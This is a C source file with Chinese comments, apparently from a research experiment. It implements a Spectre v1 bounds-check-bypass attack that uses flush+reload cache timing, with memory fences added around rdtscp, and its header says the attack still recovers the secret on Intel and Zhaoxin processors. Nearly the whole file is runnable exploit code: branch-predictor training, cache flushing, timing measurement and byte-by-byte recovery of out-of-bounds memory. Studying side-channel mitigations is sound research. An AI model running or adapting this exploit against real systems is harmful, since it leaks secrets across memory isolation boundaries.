/******************************
 * main-v2.c:针对main-v1.c的思路，只在main.c的侧信道计时部分 rdtscp 前后插入屏障
 * 
 * 实验结果: 在 Intel和兆芯处理器上，攻击均可成功恢复秘密数据。
 * 
*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>
#include "../utils/cache_instr.h"

unsigned int array1_size = 16;
uint8_t unused1[64]; 
uint8_t array1[16] = {
  1, 2, 3, 4, 5, 6, 7, 8,
  9, 10, 11, 12, 13, 14, 15, 16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; 


/* 受害者函数 */
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256]; 
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;


    for (i = 0; i < 256; i++) results[i] = 0;

    
    for (tries = 999; tries > 0; tries--) {

        for (i = 0; i < 256; i++) _mm_clflush(&array2[i * 512]);
        

        training_x = tries % array1_size; 
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            

            for (volatile int z = 0; z < 100; z++) {}
            

            x = ((j % 6) - 1) & ~0xFFFF; 
            x = (x | (x >> 16)); 
            x = training_x ^ (x & (malicious_x ^ training_x)); 

            victim_function(x);
        }

        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255; 
            addr = &array2[mix_i * 512];

            _mm_mfence();
            time1 = __rdtscp(&junk);
            _mm_mfence();
            junk = *addr; 
            _mm_mfence();
            time2 = __rdtscp(&junk) - time1;
            _mm_mfence();
            
            if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                results[mix_i]++;
        }

        /* 找出得分最高的、第二高的字节 */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } 
            else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
        break;
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
    results[0] ^= junk;
}

int main(int argc, const char **argv) {
    int cache_hit_threshold = 80;
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int len = 40; 
    int score[2];
    uint8_t value[2];
    int i;

    for (i = 0; i < (int)sizeof(array2); i++){
        array2[i] = 1;
    }

    if (argc >= 2){
        sscanf(argv[1], "%d", &cache_hit_threshold);
    }

    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear")); 
        printf("0x%02X='%c' count=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]); 
        if (score[1] > 0) {
            printf("\t(second best: 0x%02X='%c' count=%d)", value[1], (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        }
        printf("\n");
    }
    return 0;
}